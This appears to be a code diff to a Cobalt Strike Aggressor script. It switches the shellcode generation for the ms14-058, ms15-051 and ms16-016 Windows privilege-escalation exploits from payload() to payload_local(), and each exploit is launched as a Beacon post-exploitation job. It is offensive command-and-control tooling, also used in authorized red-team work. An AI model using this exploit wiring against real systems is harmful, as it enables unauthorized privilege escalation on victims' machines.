@@ -122,7 +122,7 @@ sub ms14_058_exploit {
 	}
 
 	# generate our shellcode
-	$stager = payload($2, $arch);
+	$stager = payload_local($1, $2, $arch);
 
 	# spawn a Beacon post-ex job with the exploit DLL
 	bdllspawn!($1, $dll, $stager, "ms14-058", 5000);
@@ -152,7 +152,7 @@ sub ms15_051_exploit {
 	}
 
 	# generate our shellcode
-	$stager = payload($2, $arch);
+	$stager = payload_local($1, $2, $arch);
 
 	# spawn a Beacon post-ex job with the exploit DLL
 	bdllspawn!($1, $dll, $stager, "ms15-051", 5000);
@@ -178,7 +178,7 @@ sub ms16_016_exploit {
 	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016", "T1068");
 
 	# generate our shellcode
-	$stager = payload($2, "x86");
+	$stager = payload_local($1, $2, "x86");
 
 	# spawn a Beacon post-ex job with the exploit DLL
 	bdllspawn!($1, getFileProper(script_resource("modules"), "cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
